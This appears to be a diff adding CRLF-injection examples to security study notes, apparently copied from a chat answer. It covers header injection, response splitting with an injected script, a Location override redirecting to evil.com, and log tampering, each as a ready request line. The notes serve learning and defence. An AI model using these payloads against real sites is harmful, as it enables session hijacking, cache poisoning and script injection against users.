@@ -27,6 +27,50 @@ Edit
 HTTP/1.1 200 OK
 Content-Type: text/html
 Set-Cookie: session=abcd1234
+
+
+
+
+
+
+💥 Common Exploit Examples
+1. HTTP Header Injection
+http
+Copy
+Edit
+GET /page?name=foo%0d%0aSet-Cookie:%20admin=true HTTP/1.1
+Host: vulnerable.com
+Result: Adds a Set-Cookie header to the response.
+
+2. HTTP Response Splitting
+http
+Copy
+Edit
+GET /?lang=en%0d%0aContent-Length:%200%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1
+Host: vulnerable.com
+Result: Injects a second response with malicious content. In real attacks, this can be used for:
+
+XSS
+
+Redirects
+
+Cache poisoning
+
+3. CRLF in Redirects
+http
+Copy
+Edit
+https://example.com/redirect?url=https://safe.com%0d%0aLocation:%20https://evil.com
+If unsanitized, this could override the Location header.
+
+4. Log Injection / Splitting
+If the application logs input, this can tamper with logs:
+
+ini
+Copy
+Edit
+username=admin%0a[CRLF Injection Detected]%0a
+
 Set-Cookie: session=hacked   <-- Injected malicious header
 3. Common CRLF Injection Payloads
 A. Injecting a New Header (Cookie Manipulation)
